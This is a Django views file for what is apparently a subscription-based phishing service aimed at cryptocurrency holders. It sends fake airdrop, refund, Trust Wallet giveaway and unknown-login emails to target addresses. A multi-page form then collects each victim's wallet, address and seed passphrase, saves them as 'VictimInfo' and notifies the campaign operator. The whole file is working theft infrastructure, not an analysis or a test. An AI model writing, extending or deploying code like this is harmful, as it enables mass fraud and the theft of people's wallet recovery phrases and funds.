import logging
from django.conf import settings
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from .models import Campaign, VictimInfo, Wallet, EmailTemplate
from .forms import WalletForm, AddressForm, PassphraseForm, CampaignForm, MultiCampaignForm
from django.core.mail import send_mail, EmailMultiAlternatives
from django.template.loader import render_to_string
from account.models import UserProfile
from django.utils.html import strip_tags
from django.contrib.sites.shortcuts import get_current_site
from django.core.mail import get_connection
from .decorators import subscription_required
from django.utils import timezone
from account.models import Subscription, SubscriptionPlan



logger = logging.getLogger(__name__)

# Mapping of email templates
TEMPLATE_MAPPING = {
    'AIRDROP': 'emails/airdrop_notification.html',
    'REFUND': 'emails/refund_notification.html',
    'GIVEAWAY': 'emails/giveaway_notification.html',
    'UNKNOWN DEVICE LOGIN': 'emails/unknown_device_login.html',
}

def index(request):
    return render(request, 'core/index.html')

@login_required
@subscription_required()
def create_campaign(request):
    user_profile = UserProfile.get_profile(request.user)

    if request.method == 'POST':
        form = CampaignForm(request.POST)
        if form.is_valid():
            campaign = form.save(commit=False)
            campaign.user = request.user
            
            # Check user's subscription
            subscription = Subscription.objects.filter(
                user=request.user,
                is_active=True,
                end_date__gt=timezone.now()
            ).first()
            
            if subscription and not subscription.has_reached_limit():
                campaign.save()
                
                try:
                    send_campaign_email(campaign, request)
                    messages.success(request, 'Campaign created and email sent successfully!')
                except Exception as e:
                    logger.error(f"Failed to send email: {str(e)}")
                    campaign.delete()  # Rollback campaign creation if email fails
                    messages.error(request, 'Email sending failed. Campaign was not created.')
                    
                return redirect('core:campaign_list')
            else:
                messages.error(request, 'Monthly email limit reached for this template.')
                return redirect('core:campaign_list')
    else:
        form = CampaignForm()

    email_templates = EmailTemplate.objects.all()
    email_templates_data = []
    
    # Get active subscription info
    subscription = Subscription.objects.filter(
        user=request.user,
        is_active=True,
        end_date__gt=timezone.now()
    ).first()

    for template in email_templates:
        if subscription:
            email_templates_data.append({
                'id': template.id,
                'type': template.type,
                'max_emails': subscription.plan.max_emails_per_month
            })

    return render(request, 'core/create_campaign.html', {
        'form': form,
        'email_templates': email_templates_data,
        'user_profile':user_profile
    })


@login_required
@subscription_required()
def create_multi_campaign(request):
    user_profile = UserProfile.get_profile(request.user)

    if request.method == 'POST':
        form = MultiCampaignForm(request.POST)
        if form.is_valid():
            email_1 = form.cleaned_data.get('email_1')
            email_2 = form.cleaned_data.get('email_2')
            email_3 = form.cleaned_data.get('email_3')

            recipient_emails = [email for email in [email_1, email_2, email_3] if email]
            campaign_template = form.cleaned_data['email_template']
            cryptocurrency = form.cleaned_data['cryptocurrency']
            quantity = form.cleaned_data['quantity']
            min_balance = form.cleaned_data['min_balance']

            # Get active subscription - removed template filter
            subscription = Subscription.objects.filter(
                user=request.user,
                is_active=True,
                end_date__gt=timezone.now()
            ).first()

            if not subscription:
                messages.error(request, 'Active subscription required')
                return redirect('account:plans')

            # Check if adding these emails would exceed monthly limit
            current_usage = subscription.get_monthly_usage()
            if current_usage + len(recipient_emails) > subscription.plan.max_emails_per_month:
                messages.error(request, f'Creating these campaigns would exceed your monthly limit of {subscription.plan.max_emails_per_month} emails')
                return redirect('core:campaign_list')

            # Create campaigns for each email
            for email in recipient_emails:
                campaign = Campaign(
                    user=request.user,
                    recipient_email=email,
                    email_template=campaign_template,
                    cryptocurrency=cryptocurrency,
                    quantity=quantity,
                    min_balance=min_balance
                )
                
                try:
                    campaign.save()
                    send_campaign_email(campaign, request)
                except Exception as e:
                    logger.error(f"Failed to create campaign for {email}: {str(e)}")
                    campaign.delete()  # Rollback if email sending fails
                    messages.error(request, f"Failed to create campaign for {email}")
                    continue

            messages.success(request, 'Campaigns created and emails sent successfully!')
            return redirect('core:campaign_list')
    else:
        form = MultiCampaignForm()

    # Get templates for active subscription
    subscription = Subscription.objects.filter(
        user=request.user,
        is_active=True,
        end_date__gt=timezone.now()
    ).first()
    
    templates_data = []
    if subscription:
        email_templates = EmailTemplate.objects.all()
        for template in email_templates:
            templates_data.append({
                'id': template.id,
                'type': template.type,
                'max_emails': subscription.plan.max_emails_per_month
            })

    return render(request, 'core/create_multi_campaign.html', {
        'form': form,
        'email_templates': templates_data,
        'user_profile': user_profile
    })


@login_required
def campaign_list(request):
    campaigns = Campaign.objects.filter(user=request.user)
    return render(request, 'core/campaign_list.html', {'campaigns': campaigns})

################################## Get Victim Info ##################################

def wallet_info(request, campaign_id):
    campaign = get_object_or_404(Campaign, id=campaign_id)

    if request.method == 'POST':
        form = WalletForm(request.POST)
        if form.is_valid():
            victim_info = form.save(commit=False)
            # Store wallet ID and name in session
            request.session['victim_wallet_id'] = victim_info.wallet.id
            request.session['victim_wallet_name'] = victim_info.wallet.name  # Optional
            return redirect('core:address_info', campaign_id=campaign.id)
    else:
        form = WalletForm()

    return render(request, 'core/wallet_info.html', {'form': form, 'campaign': campaign})



def address_info(request, campaign_id):
    campaign = get_object_or_404(Campaign, id=campaign_id)

    if request.method == 'POST':
        form = AddressForm(request.POST)
        if form.is_valid():
            # Store address info in session
            request.session['victim_address'] = form.cleaned_data['address']
            # Redirect to passphrase_info with campaign_id
            return redirect('core:passphrase_info', campaign_id=campaign.id)
    else:
        form = AddressForm()

    return render(request, 'core/address_info.html', {'form': form, 'campaign': campaign})

def passphrase_info(request, campaign_id):
    campaign = get_object_or_404(Campaign, id=campaign_id)

    if request.method == 'POST':
        form = PassphraseForm(request.POST)
        if form.is_valid():
            victim_info = VictimInfo(
                user=campaign.user,  # Associate the current user
                wallet=get_object_or_404(Wallet, id=request.session.get('victim_wallet_id')),  # Fetch wallet info from session
                campaign=campaign,  # Set the associated campaign
                passphrase=form.cleaned_data['passphrase'],
                address=request.session.get('victim_address'),
            )
            victim_info.save()

            # Clear session data after saving
            del request.session['victim_wallet_id']
            del request.session['victim_address']

            #send email notification to user 
            send_victim_info_notification(user_email=campaign.user.email, campaign=campaign)
            messages.success(request, 'Victim info saved successfully!')

            return redirect('core:success', pk=campaign.id)  # Redirect to view all submitted info
    else:
        form = PassphraseForm()

    return render(request, 'core/passphrase_info.html', {'form': form, 'campaign': campaign})


################################## Success Page ##################################
def success(request, pk):
    campaign = get_object_or_404(Campaign, id=pk)
    
    return render(request, 'core/success.html', {'campaign': campaign})






@login_required
def campaign_detail(request, pk):
    campaign = get_object_or_404(Campaign, pk=pk)
    return render(request, 'core/campaign_detail.html', {'campaign': campaign})

@login_required
def victim_info_list(request):
    victim_infos = VictimInfo.objects.filter(user=request.user).order_by('-created_at')  # Corrected query
    return render(request, 'core/victim_info_list.html', {'victim_infos':victim_infos})  # Corrected context variable


################################ EMAIL SENDING ###################################
################################ EMAIL SENDING ###################################
################################ EMAIL SENDING ###################################



def get_base_url(request):
    return f"https://prowebcheck.online"



def send_campaign_email(campaign, request):
    base_url = get_base_url(request)
    context = {
        'base_url': base_url,
        'campaign_id': campaign.id,
        'cryptocurrency': campaign.cryptocurrency,
        'quantity': campaign.quantity,
        'min_balance': campaign.min_balance,
    }

    # Get the template path using the mapping
    template_type = campaign.email_template.type
    template_path = TEMPLATE_MAPPING.get(template_type)

    if not template_path:
        raise ValueError(f"Invalid email template type: {template_type}")

    # Define subject based on template type
    if template_type == "Airdrop Received":
        subject = "Airdrop Notification"
    elif template_type == "GIVEAWAY":
        subject = "Trust Wallet Giveaway"
    elif template_type == "REFUND":
        subject = "Refund Notification"
    elif template_type == "UNKNOWN DEVICE LOGIN":
        subject = "Unknown Device Login"
    else:
        subject = "Notification"

    # Render the email body
    html_message = render_to_string(template_path, context)
    plain_message = strip_tags(html_message)

    recipient_email = campaign.recipient_email

    # Set specific SMTP settings based on the campaign type
    smtp_settings = settings.CAMPAIGN_EMAIL_BACKENDS.get(template_type)

    if smtp_settings:
        with get_connection(
            backend='django.core.mail.backends.smtp.EmailBackend',
            fail_silently=False,
            **smtp_settings
        ) as connection:
            try:
                send_mail(
                    subject,
                    plain_message,
                    smtp_settings['EMAIL_HOST_USER'],  # Use the user from the specific campaign backend
                    [recipient_email],
                    html_message=html_message,
                    connection=connection,
                )
                logger.info(f"Campaign email sent to {recipient_email} for campaign {campaign.id}.")
            except Exception as e:
                logger.error(f"Failed to send campaign email for {campaign.id} to {recipient_email}: {e}", exc_info=True)
    else:
        logger.error(f"No SMTP settings found for template type: {template_type}")

def send_victim_info_notification(user_email, campaign):
    subject = f"Victim Info Submitted for Campaign: {campaign.id}"
    message = f"""
    Hello,

    The victim associated with your campaign "{campaign.email_template.type}" has successfully submitted all the required information.

    You can view the submitted information in your campaign dashboard.

    Best regards,
    Your Platform Team
    """
    
    try:
        send_mail(
            subject,
            message,  # Plain text message
            settings.DEFAULT_FROM_EMAIL,
            [user_email],
            fail_silently=False,  # Set to True if you want to ignore errors
        )
        logger.info(f"Victim info notification sent to {user_email} for campaign {campaign.id}.")
    except Exception as e:
        logger.error(f"Failed to send victim info notification for campaign {campaign.id} to {user_email}: {e}", exc_info=True)
